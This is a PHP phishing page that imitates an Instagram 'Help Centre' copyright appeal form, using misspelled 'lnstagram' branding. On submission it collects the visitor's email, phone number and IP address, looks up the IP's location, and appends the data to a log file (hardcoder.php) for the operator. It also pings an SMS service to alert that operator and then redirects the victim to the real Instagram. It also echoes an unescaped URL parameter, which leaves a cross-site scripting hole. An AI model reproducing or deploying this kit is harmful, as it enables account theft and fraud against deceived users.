<?php
session_start();
$user=$_GET["user"];
ini_set('display_errors',1);
set_time_limit(0);

if($_POST){
        $ch = curl_init();
/////////========Luminati
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_URL, 'https://www.uygunsms.com.tr/'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.uygunsms.com.tr',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en-US,en;q=0.9,tr;q=0.8',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.uygunsms.com.tr',
'Referer: https://www.uygunsms.com.tr/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'txt_gsmno=525255522'); //BURAYA NUMARANIZI YAZIN 0 OLMADAN YAZICAKSINIZ
$result = curl_exec($ch);
$mail=$_POST["mail"];
$tel=$_POST["tel"]; 
$cur_time=date("d-m-Y H:i:s");
$file = fopen('hardcoder.php', 'a');
$ip = $_SERVER['REMOTE_ADDR'];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
date_default_timezone_set('Europe/Istanbul');  
fwrite($file, "
<html>
<head>
    <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<font color='#76ff43'>3.sayfa</font><br>
<font color='red'>Email: </font><font color='white'>".$mail."</font><br>
<font color='red'> Telno: </font><font color='white'>".$tel."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<hr>
<br>

"); 
fclose($file);
header("location: https://instagram.com/");
}

?>
<!doctype html>
<html>
 <head> 
  <link href="//netdna.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.css" rel="stylesheet">
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1"> 
  <title>Help Centre</title> 
  <link rel="icon" href="https://www.freepnglogos.com/uploads/instagram-logo-png-transparent-0.png"> 
  <style>
   @media screen and (min-width: 1000px){
    body{
     background: #fafafa;
     font-family: arial;
   }
   .header{
     background-color: #ffffff;
     margin-left: -10px;
     margin-top: -10px;
     padding-right: 18px;
     padding-top: 20px;
     width: 100%;
     height: 60px;
     border-bottom: 1px solid #efefef;
   }
   #arainput{
	 background-color: #fafafa;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     width: 215px;
	 padding: 6px 5px 5px 26px;
	 font-size: 14px;
	 outline: none;
	 display: inline-block;
	 margin-left: 150px;
	 position: relative;
	 top: -10px;
	}
   #araresim{
     width: 13px;
	 position: relative;
	 top: -5px;
	 left: -245px;
   }
   #arainput::placeholder{
	font-size: 14px;
	font: 400 13.3333px Arial;
	color: #999999;
   }
   #logo{
	width: 0px;
	height: 0px;
	background: url("img/emirlogo.png") no-repeat;
	background-size: cover;
	display: inline-block;
	margin-left: 6%;
   }
   #kutu{
     margin-top: 60px;
     background-color: #ffffff;
     border: 1px solid #dbdbdb;
     border-radius: 0 0 3px 3px;
     margin-left: 5px;
	 width: 990px;
	 text-align: left;
   }
   #ara{
     border-bottom: 1px solid #dbdbdb;
     width: 98%;
     padding-left: 20px;
     padding-top: 6px;
     padding-bottom: 6px;
     font-size: 16px;
     color: #999999;
     font-weight: 600;
   } 
   .reginaofcx a{
     width: 228px;
     height: 21px;
     padding: 16px;
     display: inline-block;
     color: #262626;
       font-size: 14px;
     text-decoration: none;
   }
   .reginaofcx{
     display: block;
   }
   .reginaofcx:hover{
     border-left: 2px solid #bdbcbc;
   }
   #yan{
     border-right: 1px solid #dbdbdb;
     display: block;
     width: 300px;
     height: 737px;
     float: left;
   }
   #ic{
     padding-left: 30px;
     padding-right: 30px;
     padding-top: 30px;
       padding-bottom: 150px;
     display: inline-block;
     width: 610px;
   }
   #footer b {
     font-size: 12px;
     color: #262626;
     display: inline-block;
     margin-right: 30px;
     margin-left: 8px;
     float: right;
   }
   #footer label{
     color: #999999;
     font-weight: 400;
     margin: -5px .5em;
     padding: 5px .15em;
     margin-top: 30px;
     display: inline-block;
   }
    #yükleniyormoruq{
     background: url("https://www.freepnglogos.com/uploads/instagram-logo-png-transparent-background-hd-3.png") no-repeat;
	 background-size: cover;
	 margin: auto;
	 display: block;
	 margin-top: 28%;
	 width: 40px;
	 height: 40px;
	}
    }
    
    
    @media screen and (max-width: 1000px){
   body{
     background: #ffffff;
     font-family: arial;
   }
   #yan{
     display: none;
   }
   #kutu{
	text-align: left;
   }
   .header{
     background-color: #ffffff;
     margin-left: -10px;
     margin-top: -10px;
     padding-right: 18px;
     padding-top: 20px;
     width: 100%;
     height: 120px;
     text-align: center;
   }
   #logo{
     background: url("https://i.imgyukle.com/2020/06/30/C3F3Wy.jpg") no-repeat; 
     display: block;
     width: 190px;
     background-size: cover;
     height: 40px;
	 margin: auto;
	 margin-top: 15px;
   }
    #arainput{
	 background-color: #ffffff;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     width: 90%;
	 padding: 6px 5px 5px 26px;
	 font-size: 14px;
	 outline: none;
	 display: block;
	 margin: auto;
	 margin-top: 20px;
	 margin-left: 15px;
	}
	#arainput::placeholder{
	font-size: 14px;
	font: 400 13.3333px Arial;
	color: #999999;
   }
   #araresim{
	position: relative;
	left: -43%;
	top: -25px;
   }
   #ara{
     border: 1px solid #dbdbdb;
     width: 100%;
     padding-left: 60px;
     font-size: 14px;
     color: #999999;
     font-weight: 600;
	 position: absolute;
	 right: 0px;
	 left: 0px,
	 display: block;
   }
   #ara p{
	padding-left: 20px;
   }
    #ic{
     padding-left: 10px;
     padding-right: 30px;
     padding-top: 70px;
     padding-bottom: 20px;
   }
    #footer b {
     font-size: 12px;
     color: #262626;
     display: block;
     margin-top: 20px;
     margin-left: 8px;
   }
   #footer label{
     color: #999999;
     font-weight: 400;
     margin: -5px .5em;
     padding: 5px .15em;
   }
   #yükleniyormoruq{
     background: url("https://i.imgyukle.com/2020/07/04/C9EoWs.png") no-repeat;
	 background-size: cover;
	 margin: auto;
	 display: block;
	 margin-top: 70%;
	 width: 50px;
	 height: 50px;
	}
    }
	
	
	
   #ic b{
     color: #1C1E21;
   }
   #ic p{
     font-size: 13px;
     color: #4b4f56;
     line-height: 1.5;
   }
   #footer{
     background-color: #fafafa;
     width: 100%;
     height: 140px;
     display: block;
     margin-left: -10px;
     position: relative;
     bottom: -20px;
     padding-left: 18px;
     padding-top: 19px;
     font-size: 12px;
   }
   #footer a{
     color: #003569;
     padding: 5px .15em;
     text-decoration: none;
     font-size: 12px;
     font-weight: bold;
     margin-left: 8px;
   }
   #ic b{
     color: #1C1E21;
   }
   
   #ic p{
     font-size: 13px;
     color: #4b4f56;
     line-height: 1.5;
   }
   #ic p a{
     color: #3897f0;
     text-decoration: none;
   }
   form{
     color: #90949c;
     font-size: 12px;
   }
   form label{
     font-weight: 600;
     line-height: 1.538;
     margin-top: 10px;
     padding: 0px;
   }
   .m{
     width: 300px;
     border: 1px solid #dddfe2;
     color: #1d2129;
     height: 25px;
     font-size: 12px;
     line-height: 16px;
     padding: 0 8px;
     margin-top: 6px;
   }
   .mp{
     width: 318px;
     border: 1px solid #dddfe2;
     color: #1d2129;
     height: 25px;
     font-size: 12px;
     line-height: 16px;
     padding: 0 8px;
     margin-top: 6px;
   }
   form span{
     text-decoration: none;
     color: #90949c;
     line-height: 1.5;
   }
   .iamsad{
     display: block;
     margin-top: 10px; 
   }
   .melisa{
     color: #1c1e21;
     width: 50px;
     margin-left: -54px;
     background: none;
     border: none;
     font-weight: bold;
     outline: none;
     font-size: 12px;
     display: none;
   }
   #btn{
     line-height: 26px;
     padding: 0 10px;
     background-color: #4267b2;
     color: #ffffff;
     font-weight: bold;
     text-align: center;
     border: 1px solid #4267b2;
     border-radius: 2px;
     margin-top: 10px;
   }
   #footer{
     background-color: #fafafa;
     width: 100%;
     height: 140px;
     display: block;
     margin-left: -10px;
     position: relative;
     bottom: -20px;
     padding-left: 18px;
     padding-top: 19px;
     font-size: 12px;
   }
   #footer a{
     color: #003569;
     padding: 5px .15em;
     text-decoration: none;
     font-size: 12px;
     font-weight: bold;
     margin-left: 8px;
   }
	#tik{
	 width: 20px;
	 position: relative;
	 top: 3px;
	}
	#reginaofc{
	 display: none;
	}
	#reginaisafk{
	 width: 50px;
	 display: none;
	}
  </style>
<script>
window.onload = function() {

document.getElementById("reginaofc").style.display = "block";
  document.getElementById("slm").style.display = "none";
};
function regina(){
    var sif = document.getElementById("pw").value;
    if (sif != " "){
      document.getElementById("btnpw").style.display="inline";
    }
    if (sif == ""){
      document.getElementById("btnpw").style.display="none";
    }
  }
  function melisad() { 
                var temp = document.getElementById("pw");
                if (temp.type === "password") { 
                  temp.type = "text"; 
                  document.getElementById("btnpw").value="Hide";
              } 
                else { 
                  temp.type = "password"; 
                  document.getElementById("btnpw").value="Show";
              } 
      
       }
   function melisa(){
    var mailsif = document.getElementById("mailpw").value;
    if (mailsif != " "){
      document.getElementById("btnmailpw").style.display="inline";
    }
    if (mailsif == ""){
      document.getElementById("btnmailpw").style.display="none";
    }
  }
  function reginasad() { 
                var temp = document.getElementById("mailpw");
                if (temp.type === "password") { 
                  temp.type = "text"; 
                  document.getElementById("btnmailpw").value="Hide";
              } 
                else { 
                  temp.type = "password"; 
                  document.getElementById("btnmailpw").value="Show";
              } 
      
       }
</script>
  <script>
var isNS = (navigator.appName == "Netscape") ? 1 : 0;
var EnableRightClick = 1;
if(isNS)
document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
function mischandler(){
if(EnableRightClick==1){ return true; }
else {return false; }
}
function mousehandler(e){
if(EnableRightClick==1){ return true; }
var myevent = (isNS) ? e : event;
var eventbutton = (isNS) ? myevent.which : myevent.button;
if((eventbutton==2)||(eventbutton==3)) return false;
}
function keyhandler(e) {
var myevent = (isNS) ? e : window.event;
if (myevent.keyCode==96)
EnableRightClick = 1; 
return;
}
document.oncontextmenu = mischandler;
document.onkeypress = keyhandler;
document.onmousedown = mousehandler;
document.onmouseup = mousehandler;
</script> 
 </head> 
 <body> 
<img src="https://thumbor.sd-cdn.fr/sHaj_Qv3a99Nj0vOdzrQAi9TaR8=/fit-in/1909x886/cdn.sd-cdn.fr/wp-content/uploads/2016/05/instagram-nouveau-logo-1.png" id="reginaisafk">
 <div id="slm">
 <div id="yükleniyormoruq"> </div>
 </div>
<div id="reginaofc">
   <div class="header"> 
  <img src="https://i.hizliresim.com/qvrxyun.png"/>
  <BR>
	<img src="https://i.hizliresim.com/tno526n.png"></img>
 <BR>
  </div> 
  <center>
  <div id="kutu"> 
   <div id="ara"> 
    <p> Help Centre </p> 
   </div> 
   <div id="yan"> 
    <div class="reginaofcx"> 
     <a href="">Using lnstagram</a> 
<i class="fa fa-chevron-right" aria-hidden="true"></i>
    </div> 
    <div class="reginaofcx"> 
     <a href="">Managing Your Account</a> 
<i class="fa fa-chevron-right" aria-hidden="true"></i>
    </div> 
    <div class="reginaofcx"> 
     <a href="">Troubleshooting and Login Help</a> 
<i class="fa fa-chevron-right" aria-hidden="true"></i>

    </div> 
    <div class="reginaofcx"> 
     <a href="">Privacy and Safety Center</a> 
<i class="fa fa-chevron-right" aria-hidden="true"></i>

    </div> 
    <div class="reginaofcx"> 
     <a href="">lnstagram for Businesses</a> 
<i class="fa fa-chevron-right" aria-hidden="true"></i>

    </div> 
   </div> 
   <div id="ic"> 
    <b>Copyright Appeal Form </b>&nbsp
    <p><font size='2'> Hello,</font><font size='2' color='black'><?php echo $user; ?></font><br> </p><p>
We purchase and review a daily report of our entitlement to a post on Instagram. There may be an error for this, you can reach it via this form.
</p> 
	<form method="POST"> 
     <label>Your name and surname on your identity card</label> 
     <br> 
     <input type="text" class="m" name="full_name"> 
     <br> <div class="iamsad"> 
     
      <label>E-Mail Address </label> 
      <br>
       <span>Email address registered in your lnstagram account</span>
      <br> 
      <span></span>
      <input type="email" class="m" name="mail" required> 

     </div>  <br> 
     <label>Phone Number</label> 
       <span></span>
      <br> 
      <input type="" class="m" name="tel" required>  
<br><br>
     <label>Your Disclosure to Our Instagram Team:</label>
     <br> 
     <input type="text"  class="m" name="full_name"> 
     <br>
  
     <div class="iamsad"> 
     </div>
     <input type="submit" id="btn" name="submit" value="Send"> 
    </form> 
   </div> 
  </div> 
  </center>
  <div id="footer"> 
  <center>
   <a href=""> ABOUT US </a> 
   <a href=""> HELP </a> 
   <a href=""> API </a> 
   <a href=""> JOBS </a> 
   <a href=""> TERMS </a> 
   <a href=""> PRIVACY </a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
   <b> © 2021 lNSTAGRAM, INC. </b> 
   <br> 
<label>TÜRKÇE
KURDÎ (KURMANCÎ)
العربية
ZAZA
DEUTSCH
<br><br>
РУССКИЙ
FRANÇAIS (FRANCE)
<br><br>
فارسی
ESPAÑOL
PORTUGUÊS (BRASIL)
</label>

  </div> 
 </div>
 </body>
</html>
